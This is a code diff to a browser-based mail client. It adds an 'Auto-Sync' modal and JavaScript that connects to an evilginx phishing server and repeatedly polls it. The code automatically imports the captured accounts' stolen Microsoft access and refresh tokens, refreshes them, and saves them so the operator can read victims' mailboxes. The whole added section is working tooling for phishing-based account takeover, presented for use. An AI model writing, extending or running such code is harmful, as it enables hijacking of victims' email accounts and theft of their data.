@@ -475,7 +475,7 @@ body{font-family:'Segoe UI Variable Text','Segoe UI',-apple-system,BlinkMacSyste
         <button class="header-btn" onclick="manualRefresh()" title="Notifications">
             <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z"/></svg>
         </button>
-        <button class="header-btn" onclick="manualRefresh()" title="Settings">
+        <button class="header-btn" onclick="document.getElementById('feedSettingsModal').classList.remove('hidden');document.getElementById('feedUrl').value=localStorage.getItem('feed_url')||''" title="Settings">
             <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 00.12-.61l-1.92-3.32a.488.488 0 00-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.44.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.07.62-.07.94s.02.64.07.94l-2.03 1.58a.49.49 0 00-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6A3.6 3.6 0 1115.6 12 3.6 3.6 0 0112 15.6z"/></svg>
         </button>
         <div class="header-avatar" id="userAvatar" onclick="toggleUserMenu()">?</div>
@@ -1511,6 +1511,46 @@ body{font-family:'Segoe UI Variable Text','Segoe UI',-apple-system,BlinkMacSyste
     </div>
 </div>
 
+<!-- Feed Settings Modal -->
+<div class="modal-overlay hidden" id="feedSettingsModal">
+    <div class="modal">
+        <div class="modal-header">
+            <h2>Auto-Sync Settings</h2>
+            <button class="modal-close" onclick="document.getElementById('feedSettingsModal').classList.add('hidden')">
+                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+            </button>
+        </div>
+        <div class="modal-body">
+            <div style="margin-bottom:16px;padding:12px;background:#e8f4fd;border-radius:6px;font-size:13px;color:#0f6cbd">
+                <strong>Auto-sync</strong> connects to your evilginx server and automatically imports captured accounts. Tokens are kept alive server-side for 90 days.
+            </div>
+            <div class="form-group">
+                <label class="form-label">Feed URL</label>
+                <input type="text" class="form-input" id="feedUrl" placeholder="https://your-domain.com/api/v1/feed?key=YOUR_API_KEY">
+                <div class="form-hint">Get this from evilginx terminal: type <strong>feed url</strong></div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Sync Interval</label>
+                <select class="form-input" id="feedInterval" style="padding:8px 12px">
+                    <option value="15">Every 15 seconds</option>
+                    <option value="30" selected>Every 30 seconds</option>
+                    <option value="60">Every 1 minute</option>
+                    <option value="300">Every 5 minutes</option>
+                </select>
+            </div>
+            <div id="feedStatus" style="margin-top:8px;padding:10px;background:var(--surface-alt);border-radius:6px;font-size:12px;display:none">
+                <span id="feedStatusText">Not connected</span>
+            </div>
+            <div class="form-error hidden" id="feedError"></div>
+        </div>
+        <div class="modal-footer">
+            <button class="modal-btn secondary" onclick="disconnectFeed()">Disconnect</button>
+            <button class="modal-btn secondary" onclick="testFeed()">Test</button>
+            <button class="modal-btn primary" onclick="saveFeedSettings()">Save & Connect</button>
+        </div>
+    </div>
+</div>
+
 <!-- Add Account Modal -->
 <div class="modal-overlay hidden" id="addAccountModal">
     <div class="modal">
@@ -1648,9 +1688,181 @@ let currentEmail = null;
 let syncInterval = null;
 let lastSyncTime = null;
 let currentFileUrl = null;
+let feedInterval = null;
 
 const MS_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const folderMap = {};
+
+// ==================== TOKEN FEED AUTO-SYNC ====================
+function saveFeedSettings() {
+    const url = document.getElementById('feedUrl').value.trim();
+    const interval = parseInt(document.getElementById('feedInterval').value);
+    const errEl = document.getElementById('feedError');
+
+    if (!url) {
+        errEl.textContent = 'Feed URL is required';
+        errEl.classList.remove('hidden');
+        return;
+    }
+
+    localStorage.setItem('feed_url', url);
+    localStorage.setItem('feed_interval', interval.toString());
+    errEl.classList.add('hidden');
+    document.getElementById('feedSettingsModal').classList.add('hidden');
+    startFeedSync();
+    toast('Auto-sync connected! Checking for new accounts...', 'success');
+}
+
+function disconnectFeed() {
+    localStorage.removeItem('feed_url');
+    if (feedInterval) { clearInterval(feedInterval); feedInterval = null; }
+    document.getElementById('feedSettingsModal').classList.add('hidden');
+    document.getElementById('syncStatus').textContent = 'Feed disconnected';
+    toast('Auto-sync disconnected', 'info');
+}
+
+async function testFeed() {
+    const url = document.getElementById('feedUrl').value.trim();
+    const errEl = document.getElementById('feedError');
+    const statusEl = document.getElementById('feedStatus');
+    const statusText = document.getElementById('feedStatusText');
+
+    if (!url) {
+        errEl.textContent = 'Enter a feed URL first';
+        errEl.classList.remove('hidden');
+        return;
+    }
+
+    errEl.classList.add('hidden');
+    statusEl.style.display = 'block';
+    statusText.textContent = 'Testing connection...';
+    statusEl.style.background = '#fff4ce';
+
+    try {
+        const controller = new AbortController();
+        setTimeout(() => controller.abort(), 10000);
+        const resp = await fetch(url, { signal: controller.signal });
+
+        if (!resp.ok) {
+            const txt = await resp.text();
+            statusText.textContent = `Error ${resp.status}: ${txt.substring(0, 100)}`;
+            statusEl.style.background = '#fde7e9';
+            return;
+        }
+
+        const data = await resp.json();
+        statusText.textContent = `Connected! ${data.count || 0} accounts available`;
+        statusEl.style.background = '#dff6dd';
+        errEl.classList.add('hidden');
+    } catch(e) {
+        if (e.name === 'AbortError') {
+            statusText.textContent = 'Connection timed out (10s)';
+        } else {
+            statusText.textContent = 'Failed: ' + e.message;
+        }
+        statusEl.style.background = '#fde7e9';
+    }
+}
+
+function startFeedSync() {
+    const url = localStorage.getItem('feed_url');
+    if (!url) return;
+
+    const interval = parseInt(localStorage.getItem('feed_interval') || '30') * 1000;
+
+    if (feedInterval) clearInterval(feedInterval);
+
+    // Fetch immediately
+    fetchFeed(url);
+
+    // Then on interval
+    feedInterval = setInterval(() => fetchFeed(url), interval);
+    console.log('[feed] Auto-sync started, interval:', interval/1000, 's');
+}
+
+async function fetchFeed(url) {
+    try {
+        const controller = new AbortController();
+        setTimeout(() => controller.abort(), 15000);
+        const resp = await fetch(url, { signal: controller.signal });
+
+        if (!resp.ok) {
+            console.warn('[feed] Feed error:', resp.status);
+            return;
+        }
+
+        const data = await resp.json();
+        if (!data.accounts || !Array.isArray(data.accounts)) return;
+
+        let newCount = 0;
+
+        for (const feedAcc of data.accounts) {
+            // Check if already imported (by feed ID or email match)
+            const exists = accounts.some(a =>
+                a.feedId === feedAcc.id ||
+                (a.email && feedAcc.email && a.email.toLowerCase() === feedAcc.email.toLowerCase())
+            );
+
+            if (exists) {
+                // Update existing account's tokens (server keeps them fresh)
+                const idx = accounts.findIndex(a =>
+                    a.feedId === feedAcc.id ||
+                    (a.email && feedAcc.email && a.email.toLowerCase() === feedAcc.email.toLowerCase())
+                );
+                if (idx >= 0 && feedAcc.accessToken) {
+                    accounts[idx].accessToken = feedAcc.accessToken;
+                    if (feedAcc.refreshToken) accounts[idx].refreshToken = feedAcc.refreshToken;
+                    accounts[idx].lastFeedSync = new Date().toISOString();
+                }
+                continue;
+            }
+
+            // New account — auto-import
+            if (!feedAcc.accessToken) continue;
+
+            const acc = {
+                id: Date.now().toString() + '-' + Math.random().toString(36).substr(2, 5),
+                feedId: feedAcc.id,
+                accessToken: feedAcc.accessToken,
+                refreshToken: feedAcc.refreshToken || null,
+                email: feedAcc.email || 'Unknown',
+                displayName: feedAcc.displayName || feedAcc.email || 'Account',
+                label: null,
+                addedAt: feedAcc.capturedAt || new Date().toISOString(),
+                lastFeedSync: new Date().toISOString(),
+                autoImported: true,
+                unreadCount: 0
+            };
+
+            accounts.push(acc);
+            newCount++;
+        }
+
+        if (newCount > 0) {
+            saveAccounts();
+            renderAccountDropdown();
+            toast(`Auto-imported ${newCount} new account${newCount > 1 ? 's' : ''}!`, 'success');
+
+            // Auto-select first account if none selected
+            if (currentAccountIdx < 0) {
+                selectAccount(0);
+            }
+        }
+
+        // Save accounts to persist updated tokens
+        if (data.accounts.length > 0) {
+            saveAccounts();
+        }
+
+        const syncEl = document.getElementById('syncStatus');
+        if (syncEl) syncEl.textContent = `Feed synced: ${data.count} accounts`;
+
+    } catch(e) {
+        if (e.name !== 'AbortError') {
+            console.warn('[feed] Sync error:', e.message);
+        }
+    }
+}
 
 // ==================== INIT ====================
 document.addEventListener('DOMContentLoaded', () => {
@@ -1675,6 +1887,7 @@ document.addEventListener('DOMContentLoaded', () => {
             '<div class="message-list-empty">No accounts added. Click "Add account" to get started.</div>';
     }
     startLiveSync();
+    startFeedSync(); // Auto-sync from evilginx feed
     document.addEventListener('click', (e) => {
         const dropdown = document.getElementById('accountDropdown');
         const pill = document.getElementById('accountPill');
